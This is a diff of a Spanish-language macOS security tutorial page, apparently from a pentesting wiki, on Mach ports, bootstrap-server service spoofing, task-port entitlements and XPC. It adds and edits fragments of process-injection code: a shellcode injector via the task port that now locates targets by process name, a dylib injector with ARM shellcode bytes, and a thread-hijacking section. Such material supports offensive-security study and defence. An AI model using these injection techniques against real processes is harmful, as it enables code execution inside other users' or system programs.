@@ -23,8 +23,9 @@ Los derechos de puerto, que definen las operaciones que una tarea puede realizar
 * **Derecho de recepción**, que permite recibir mensajes enviados al puerto. Los puertos de Mach son colas MPSC (multiple-producer, single-consumer), lo que significa que solo puede haber **un derecho de recepción para cada puerto** en todo el sistema (a diferencia de las tuberías, donde varios procesos pueden tener descriptores de archivo para el extremo de lectura de una tubería).
 * Una **tarea con el derecho de recepción** puede recibir mensajes y **crear derechos de envío**, lo que le permite enviar mensajes. Originalmente, solo la **propia tarea tiene el derecho de recepción sobre su puerto**.
 * **Derecho de envío**, que permite enviar mensajes al puerto.
+* El derecho de envío se puede **clonar** para que una tarea que posea un derecho de envío pueda clonar el derecho y **concedérselo a una tercera tarea**.
 * **Derecho de envío único**, que permite enviar un mensaje al puerto y luego desaparece.
-* **Derecho de conjunto de puertos**, que denota un _conjunto de puertos_ en lugar de un solo puerto. Desencolar un mensaje de un conjunto de puertos desencola un mensaje de uno de los puertos que contiene. Los conjuntos de puertos se pueden utilizar para escuchar en varios puertos simultáneamente, de manera similar a `select`/`poll`/`epoll`/`kqueue` en Unix.
+* **Derecho de conjunto de puertos**, que denota un _conjunto de puertos_ en lugar de un solo puerto. Desencolar un mensaje de un conjunto de puertos desencola un mensaje de uno de los puertos que contiene. Los conjuntos de puertos se pueden utilizar para escuchar varios puertos simultáneamente, de manera similar a `select`/`poll`/`epoll`/`kqueue` en Unix.
 * **Nombre muerto**, que no es un derecho de puerto real, sino simplemente un marcador de posición. Cuando se destruye un puerto, todos los derechos de puerto existentes para el puerto se convierten en nombres muertos.
 
 **Las tareas pueden transferir derechos de ENVÍO a otros**, lo que les permite enviar mensajes de vuelta. **Los derechos de ENVÍO también se pueden clonar, por lo que una tarea puede duplicar y dar el derecho a una tercera tarea**. Esto, combinado con un proceso intermediario conocido como el **servidor de arranque**, permite una comunicación efectiva entre tareas.
@@ -39,7 +40,7 @@ Como se menciona, para establecer el canal de comunicación, está involucrado e
 4. La tarea **B** interactúa con el **servidor de arranque** para ejecutar una **búsqueda de arranque para el servicio**. Si tiene éxito, el **servidor duplica el derecho de ENVÍO** recibido de la tarea A y **lo transmite a la tarea B**.
 5. Al adquirir un derecho de ENVÍO, la tarea **B** es capaz de **formular** un **mensaje** y enviarlo **a la tarea A**.
 
-El servidor de arranque **no puede autenticar** el nombre de servicio reclamado por una tarea. Esto significa que una **tarea** podría potencialmente **suplantar cualquier tarea del sistema**, como **falsificar un nombre de servicio de autorización** y luego aprobar cada solicitud.
+El servidor de arranque **no puede autenticar** el nombre de servicio reclamado por una tarea. Esto significa que una **tarea** podría potencialmente **suplantar cualquier tarea del sistema**, como reclamar falsamente un nombre de servicio de autorización y luego aprobar cada solicitud.
 
 Luego, Apple almacena los **nombres de los servicios proporcionados por el sistema** en archivos de configuración seguros, ubicados en directorios protegidos por SIP: `/System/Library/LaunchDaemons` y `/System/Library/LaunchAgents`. Junto a cada nombre de servicio, también se almacena el **binario asociado**. El servidor de arranque creará y mantendrá un **derecho de RECEPCIÓN para cada uno de estos nombres de servicio**.
 
@@ -47,13 +48,32 @@ Para estos servicios predefinidos, el **proceso de búsqueda difiere ligeramente
 
 * La tarea **B** inicia una **búsqueda de arranque** para un nombre de servicio.
 * **launchd** verifica si la tarea se está ejecutando y, si no lo está, la **inicia**.
-* La tarea **A** (el servicio) realiza un **registro de arranque**. Aquí, el **servidor de arranque** crea un derecho de ENVÍO, lo retiene y **transfiere el derecho de RECEPCIÓN a la tarea A**.
+* La tarea **A** (el servicio) realiza un **registro de arranque**. Aquí, el servidor de arranque crea un derecho de ENVÍO, lo retiene y **transfiere el derecho de RECEPCIÓN a la tarea A**.
 * launchd duplica el **derecho de ENVÍO y lo envía a la tarea B**.
 
 Sin embargo, este proceso solo se aplica a las tareas predefinidas del sistema. Las tareas que no son del sistema aún funcionan como se describe originalmente, lo que podría permitir la suplantación.
+### Servicios Mach
+
+Los nombres especificados en las aplicaciones ubicadas en los directorios protegidos por SIP mencionados anteriormente no pueden ser registrados por otros procesos.
+
+Por ejemplo, `/System/Library/LaunchAgents/com.apple.xpc.loginitemregisterd.plist` registra el nombre `com.apple.xpc.loginitemregisterd`:
+```json
+plutil -p com.apple.xpc.loginitemregisterd.plist
+{
+"EnablePressuredExit" => 1
+"Label" => "com.apple.xpc.loginitemregisterd"
+"MachServices" => {
+"com.apple.xpc.loginitemregisterd" => 1
+}
+"ProcessType" => "Adaptive"
+"Program" => "/usr/libexec/loginitemregisterd"
+}
+```
+Si intentas registrarlo con un código como el siguiente, no podrás hacerlo.
+
 ### Ejemplo de código
 
-Observa cómo el **receptor** **asigna** un puerto, crea un **derecho de envío** para el nombre `org.darlinghq.example` y lo envía al **servidor de arranque** mientras el receptor solicita el **derecho de envío** de ese nombre y lo utiliza para **enviar un mensaje**.
+Observa cómo el **receptor** **asigna** un puerto, crea un **derecho de envío** para el nombre `org.darlinghq.example` y lo envía al **servidor de inicio** mientras que el receptor solicitó el **derecho de envío** de ese nombre y lo utilizó para **enviar un mensaje**.
 
 {% tabs %}
 {% tab title="receptor.c" %}
@@ -233,16 +253,16 @@ printf("Sent a message\n");
 
 * **Puerto del host**: Si un proceso tiene el privilegio de **enviar** a través de este puerto, puede obtener **información** sobre el **sistema** (por ejemplo, `host_processor_info`).
 * **Puerto de privilegio del host**: Un proceso con el derecho de **enviar** a través de este puerto puede realizar acciones **privilegiadas** como cargar una extensión del kernel. El **proceso debe ser root** para obtener este permiso.
-* Además, para llamar a la API **`kext_request`**, es necesario tener el permiso **`com.apple.private.kext`**, que solo se otorga a los binarios de Apple.
+* Además, para llamar a la API **`kext_request`**, es necesario tener otros permisos **`com.apple.private.kext*`**, que solo se otorgan a los binarios de Apple.
 * **Puerto del nombre de la tarea**: Una versión no privilegiada del _puerto de la tarea_. Hace referencia a la tarea, pero no permite controlarla. Lo único que parece estar disponible a través de él es `task_info()`.
 * **Puerto de la tarea** (también conocido como puerto del kernel)**:** Con el permiso de enviar a través de este puerto, es posible controlar la tarea (leer/escribir memoria, crear hilos...).
 * Llama a `mach_task_self()` para **obtener el nombre** de este puerto para la tarea del llamador. Este puerto solo se **hereda** a través de **`exec()`**; una nueva tarea creada con `fork()` obtiene un nuevo puerto de tarea (como caso especial, una tarea también obtiene un nuevo puerto de tarea después de `exec()` en un binario suid). La única forma de generar una tarea y obtener su puerto es realizar el ["baile de intercambio de puertos"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) mientras se realiza un `fork()`.
 * Estas son las restricciones para acceder al puerto (desde `macos_task_policy` del binario `AppleMobileFileIntegrity`):
-* Si la aplicación tiene el permiso de **entitlement `com.apple.security.get-task-allow`**, los procesos del **mismo usuario pueden acceder al puerto de la tarea** (comúnmente agregado por Xcode para depurar). El proceso de **notarización** no lo permitirá en las versiones de producción.
-* Las aplicaciones con el permiso de **entitlement `com.apple.system-task-ports`** pueden obtener el **puerto de la tarea para cualquier** proceso, excepto el kernel. En versiones anteriores se llamaba **`task_for_pid-allow`**. Esto solo se otorga a las aplicaciones de Apple.
-* **Root puede acceder a los puertos de tarea** de aplicaciones **no** compiladas con un tiempo de ejecución **reforzado** (y no de Apple).
+* Si la aplicación tiene el permiso de **`com.apple.security.get-task-allow`**, los procesos del **mismo usuario pueden acceder al puerto de la tarea** (comúnmente agregado por Xcode para depurar). El proceso de **notarización** no lo permitirá en las versiones de producción.
+* Las aplicaciones con el permiso **`com.apple.system-task-ports`** pueden obtener el **puerto de la tarea para cualquier** proceso, excepto el kernel. En versiones anteriores se llamaba **`task_for_pid-allow`**. Esto solo se otorga a las aplicaciones de Apple.
+* **Root puede acceder a los puertos de tarea** de las aplicaciones **no** compiladas con un tiempo de ejecución **reforzado** (y no de Apple).
 
-### Inyección de código Shellcode a través del puerto de la tarea&#x20;
+### Inyección de shellcode en un hilo a través del puerto de la tarea&#x20;
 
 Puedes obtener un shellcode desde:
 
@@ -255,12 +275,28 @@ Puedes obtener un shellcode desde:
 ```objectivec
 // clang -framework Foundation mysleep.m -o mysleep
 // codesign --entitlements entitlements.plist -s - mysleep
+
 #import <Foundation/Foundation.h>
+
+double performMathOperations() {
+double result = 0;
+for (int i = 0; i < 10000; i++) {
+result += sqrt(i) * tan(i) - cos(i);
+}
+return result;
+}
 
 int main(int argc, const char * argv[]) {
 @autoreleasepool {
-NSLog(@"Process ID: %d", [[NSProcessInfo processInfo] processIdentifier]);
-[NSThread sleepForTimeInterval:99999];
+NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
+processIdentifier]);
+while (true) {
+[NSThread sleepForTimeInterval:5];
+
+performMathOperations();  // Silent action
+
+[NSThread sleepForTimeInterval:5];
+}
 }
 return 0;
 }
@@ -282,7 +318,7 @@ return 0;
 
 <details>
 
-<summary>injector.m</summary>
+<summary>sc_injector.m</summary>
 ```objectivec
 // gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
 
@@ -425,14 +461,54 @@ return (-3);
 return (0);
 }
 
+pid_t pidForProcessName(NSString *processName) {
+NSArray *arguments = @[@"pgrep", processName];
+NSTask *task = [[NSTask alloc] init];
+[task setLaunchPath:@"/usr/bin/env"];
+[task setArguments:arguments];
+
+NSPipe *pipe = [NSPipe pipe];
+[task setStandardOutput:pipe];
+
+NSFileHandle *file = [pipe fileHandleForReading];
+
+[task launch];
+
+NSData *data = [file readDataToEndOfFile];
+NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
+
+return (pid_t)[string integerValue];
+}
+
+BOOL isStringNumeric(NSString *str) {
+NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
+NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
+return r.location == NSNotFound;
+}
+
 int main(int argc, const char * argv[]) {
 @autoreleasepool {
 if (argc < 2) {
-NSLog(@"Usage: %s <pid>", argv[0]);
+NSLog(@"Usage: %s <pid or process name>", argv[0]);
 return 1;
 }
 
-pid_t pid = atoi(argv[1]);
+NSString *arg = [NSString stringWithUTF8String:argv[1]];
+pid_t pid;
+
+if (isStringNumeric(arg)) {
+pid = [arg intValue];
+} else {
+pid = pidForProcessName(arg);
+if (pid == 0) {
+NSLog(@"Error: Process named '%@' not found.", arg);
+return 1;
+}
+else{
+printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
+}
+}
+
 inject(pid);
 }
 
@@ -442,15 +518,15 @@ return 0;
 </details>
 ```bash
 gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
-./inject <pid-of-mysleep>
+./inject <pi or string>
 ```
-### Inyección de Dylib en el proceso a través del puerto de tarea
+### Inyección de Dylib en un hilo a través del puerto de tarea
 
-En macOS, los **hilos** pueden ser manipulados a través de **Mach** o utilizando la **API `pthread` de posix**. El hilo que generamos en la inyección anterior fue generado utilizando la API de Mach, por lo que **no es compatible con posix**.
+En macOS, los **hilos** pueden ser manipulados a través de **Mach** o utilizando la API de **pthread** de tipo **posix**. El hilo que generamos en la inyección anterior fue generado utilizando la API de Mach, por lo que **no es compatible con posix**.
 
-Fue posible **inyectar un shellcode simple** para ejecutar un comando porque no era necesario trabajar con APIs compatibles con posix, solo con Mach. **Inyecciones más complejas** requerirían que el hilo también sea **compatible con posix**.
+Fue posible **inyectar un shellcode simple** para ejecutar un comando porque no era necesario trabajar con APIs compatibles con posix, solo con Mach. Inyecciones **más complejas** requerirían que el hilo también sea **compatible con posix**.
 
-Por lo tanto, para **mejorar el shellcode**, debería llamar a **`pthread_create_from_mach_thread`**, que creará un pthread válido. Luego, este nuevo pthread podría **llamar a dlopen** para **cargar nuestra dylib** desde el sistema.
+Por lo tanto, para **mejorar el hilo**, se debe llamar a **`pthread_create_from_mach_thread`**, que creará un pthread válido. Luego, este nuevo pthread podría **llamar a dlopen** para **cargar una dylib** del sistema, por lo que en lugar de escribir nuevo shellcode para realizar diferentes acciones, es posible cargar bibliotecas personalizadas.
 
 Puedes encontrar **ejemplos de dylibs** en (por ejemplo, uno que genera un registro y luego puedes escucharlo):
 
@@ -512,7 +588,7 @@ mach_msg_type_number_t dataCnt
 
 char injectedCode[] =
 
-"\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)
+// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)
 
 // Call pthread_set_self
 
@@ -651,11 +727,13 @@ kr = mach_vm_write(remoteTask,                   // Puerto de la tarea
                    (vm_address_t) injectedCode,  // Origen
                    0xa9);                       // Longitud del origen
 
+
 if (kr != KERN_SUCCESS)
 {
     fprintf(stderr, "No se puede escribir en la memoria del hilo remoto: Error %s\n", mach_error_string(kr));
     return (-3);
 }
+
 
 // Establecer los permisos en la memoria asignada para el código del hilo remoto
 kr = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
@@ -674,6 +752,7 @@ if (kr != KERN_SUCCESS)
     fprintf(stderr, "No se pueden establecer los permisos de memoria para la pila del hilo remoto: Error %s\n", mach_error_string(kr));
     return (-4);
 }
+
 
 // Crear hilo para ejecutar el shellcode
 struct arm_unified_thread_state remoteThreadState64;
@@ -704,6 +783,8 @@ if (kr != KERN_SUCCESS) {
 return (0);
 }
 
+
+
 int main(int argc, const char * argv[])
 {
 if (argc < 3)
@@ -723,6 +804,7 @@ else
 {
     fprintf(stderr, "Dylib no encontrada\n");
 }
+
 }
 ```
 </details>
@@ -730,7 +812,9 @@ else
 gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
 ./inject <pid-of-mysleep> </path/to/lib.dylib>
 ```
-### Inyección de hilos a través del puerto de tarea <a href="#paso-1-secuestro-de-hilos" id="paso-1-secuestro-de-hilos"></a>
+### Secuestro de hilo a través del puerto de tarea <a href="#paso-1-secuestro-de-hilo" id="paso-1-secuestro-de-hilo"></a>
+
+En esta técnica se secuestra un hilo del proceso:
 
 {% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md" %}
 [macos-thread-injection-via-task-port.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md)
@@ -740,9 +824,9 @@ gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
 
 ### Información básica
 
-XPC, que significa Comunicación Interproceso (IPC) de XNU (el kernel utilizado por macOS), es un marco para la **comunicación entre procesos** en macOS e iOS. XPC proporciona un mecanismo para realizar **llamadas de método seguras y asíncronas entre diferentes procesos** en el sistema. Es parte del paradigma de seguridad de Apple, que permite la **creación de aplicaciones con privilegios separados** donde cada **componente** se ejecuta con **solo los permisos necesarios** para realizar su trabajo, limitando así el daño potencial de un proceso comprometido.
+XPC, que significa Comunicación entre Procesos de XNU (el kernel utilizado por macOS), es un marco para la **comunicación entre procesos** en macOS e iOS. XPC proporciona un mecanismo para realizar **llamadas de método seguras y asíncronas entre diferentes procesos** en el sistema. Es parte del paradigma de seguridad de Apple, que permite la **creación de aplicaciones con privilegios separados** donde cada **componente** se ejecuta con **solo los permisos necesarios** para realizar su trabajo, limitando así el daño potencial de un proceso comprometido.
 
-XPC utiliza una forma de Comunicación Interproceso (IPC), que es un conjunto de métodos para que los programas diferentes que se ejecutan en el mismo sistema envíen datos de ida y vuelta.
+XPC utiliza una forma de Comunicación entre Procesos (IPC), que es un conjunto de métodos para que los programas diferentes que se ejecutan en el mismo sistema envíen datos de ida y vuelta.
 
 Los principales beneficios de XPC incluyen:
 
@@ -800,7 +884,7 @@ cat /Library/LaunchDaemons/com.jamf.management.daemon.plist
 </dict>
 </plist>
 ```
-Los que están en **`LaunchDameons`** son ejecutados por root. Por lo tanto, si un proceso sin privilegios puede comunicarse con uno de ellos, podría ser capaz de escalar privilegios.
+Los que están en **`LaunchDameons`** son ejecutados por root. Por lo tanto, si un proceso no privilegiado puede comunicarse con uno de ellos, podría ser capaz de escalar privilegios.
 
 ### Mensajes de eventos XPC
 
@@ -880,28 +964,6 @@ return 0;
 }
 ```
 {% tab title="xpc_client.c" %}
-
-El archivo `xpc_client.c` contiene un ejemplo de código en C que ilustra cómo utilizar la comunicación interproceso (IPC) en macOS utilizando el marco XPC (eXtensible Procedure Call). 
-
-El código muestra cómo crear una conexión XPC con un servicio remoto y enviar y recibir mensajes entre el cliente y el servicio. También demuestra cómo manejar errores y liberar recursos adecuadamente.
-
-Para compilar y ejecutar el código, se requiere el SDK de desarrollo de macOS y el compilador de C. Se puede utilizar el siguiente comando para compilar el código:
-
-```bash
-gcc -o xpc_client xpc_client.c -framework Foundation -framework XPC
-```
-
-Después de compilar, se puede ejecutar el programa resultante con el siguiente comando:
-
-```bash
-./xpc_client
-```
-
-El programa establecerá una conexión con el servicio remoto y enviará un mensaje. Luego, esperará la respuesta del servicio y la mostrará en la salida estándar.
-
-Este ejemplo proporciona una introducción básica a la comunicación interproceso en macOS utilizando XPC. Se puede utilizar como punto de partida para desarrollar aplicaciones que utilicen IPC en macOS.
-
-{% endtab %}
 ```c
 // gcc xpc_client.c -o xpc_client
 
@@ -1050,16 +1112,21 @@ return 0;
 ```
 # Comunicación interproceso en macOS
 
-La comunicación interproceso (IPC) es un mecanismo utilizado por los procesos en un sistema operativo para intercambiar información y coordinar sus acciones. En macOS, hay varios métodos de IPC disponibles, incluyendo:
+La comunicación interproceso (IPC) es un mecanismo utilizado por los procesos en un sistema operativo para intercambiar información y coordinar sus acciones. En macOS, hay varios métodos de IPC disponibles, incluyendo notificaciones, sockets de dominio UNIX y puertos mach.
 
-- **Mach ports**: Los puertos Mach son un mecanismo de IPC de bajo nivel utilizado por el kernel de macOS para permitir la comunicación entre procesos.
-- **Unix domain sockets**: Los sockets de dominio Unix son un mecanismo de IPC basado en archivos utilizado para la comunicación entre procesos en el mismo sistema.
-- **Distributed notifications**: Las notificaciones distribuidas son un mecanismo de IPC utilizado para enviar mensajes entre procesos en diferentes máquinas.
-- **XPC**: XPC es un marco de IPC de alto nivel proporcionado por Apple que permite a los procesos comunicarse entre sí de manera segura y eficiente.
+## Notificaciones
 
-Estos métodos de IPC pueden ser utilizados por los atacantes para llevar a cabo escaladas de privilegios y otros ataques en sistemas macOS. Es importante entender cómo funcionan estos mecanismos de IPC y cómo asegurarlos adecuadamente para proteger el sistema contra posibles vulnerabilidades.
+Las notificaciones son una forma de IPC que permite a los procesos enviar y recibir mensajes a través del sistema de notificaciones de macOS. Los procesos pueden registrarse para recibir notificaciones sobre eventos específicos y enviar notificaciones a otros procesos.
 
-En esta sección, exploraremos en detalle cada uno de estos métodos de IPC y discutiremos las mejores prácticas para asegurar la comunicación interproceso en macOS.
+## Sockets de dominio UNIX
+
+Los sockets de dominio UNIX son otro método de IPC en macOS. Los procesos pueden crear sockets de dominio UNIX y utilizarlos para enviar y recibir datos entre sí. Los sockets de dominio UNIX son especialmente útiles para la comunicación entre procesos en la misma máquina.
+
+## Puertos mach
+
+Los puertos mach son un mecanismo de IPC de bajo nivel en macOS. Los procesos pueden crear puertos mach y utilizarlos para enviar y recibir mensajes. Los puertos mach ofrecen una mayor flexibilidad y control sobre la comunicación entre procesos, pero también requieren un mayor nivel de conocimiento y experiencia para utilizarlos correctamente.
+
+En resumen, la comunicación interproceso es una parte fundamental del sistema operativo macOS y se utiliza para permitir que los procesos se comuniquen entre sí. Hay varios métodos de IPC disponibles en macOS, incluyendo notificaciones, sockets de dominio UNIX y puertos mach. Cada método tiene sus propias ventajas y desventajas, y es importante comprenderlos para utilizarlos de manera segura y eficiente.
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
